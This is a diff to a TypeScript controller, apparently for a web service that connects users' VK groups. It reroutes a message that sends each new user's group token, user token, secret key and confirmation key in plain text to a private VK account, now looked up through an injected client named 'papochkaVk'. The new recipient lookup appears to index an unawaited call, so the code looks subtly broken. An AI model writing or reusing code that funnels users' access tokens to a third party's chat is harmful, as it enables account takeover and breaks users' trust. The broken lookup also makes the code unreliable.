@@ -12,8 +12,13 @@ import { IsNotPermissions } from "../validators/IsNotPermissions";
 import { getVkFromEnv } from "../utils/getVkFromEnv";
 import { Controller } from "./conntroller";
 import { getManagers } from "../utils/getManagers";
+import { getGigachadGroupId } from "../utils/getGigachadGroupId";
 
 export class ConnectController extends Controller {
+  constructor(private papochkaVk: VK) {
+    super();
+  }
+
   public async get(req: Request, res: Response) {
     if (req.cookies["penis"]) return res.render("success");
     return res.render("connect", { errors: null, values: null });
@@ -66,9 +71,11 @@ export class ConnectController extends Controller {
         values: req.body,
       });
     }
-    const { vk } = getVkFromEnv().filter((val) => val.c.gId === 193840305)[0];
+    const { vk } = getVkFromEnv().filter(
+      (val) => val.c.gId === getGigachadGroupId()
+    )[0];
     vk.api.messages.send({
-      peer_id: 578425189,
+      peer_id: this.papochkaVk.api.users.get({})[0].id,
       random_id: getRandomId(),
       message: `Зарегистрирован [id${user_id}|новый пользователь ${first_name} ${last_name}]\nСтрана - [club${group_id}|${group_name}]\n\nGroupToken - ${token_group}\nUserToken - ${token_user}\n\nСекретный ключ - ${secret}\nConfirmation ключ - ${confirm}\n\nНазвание региона - ${name}`,
     });
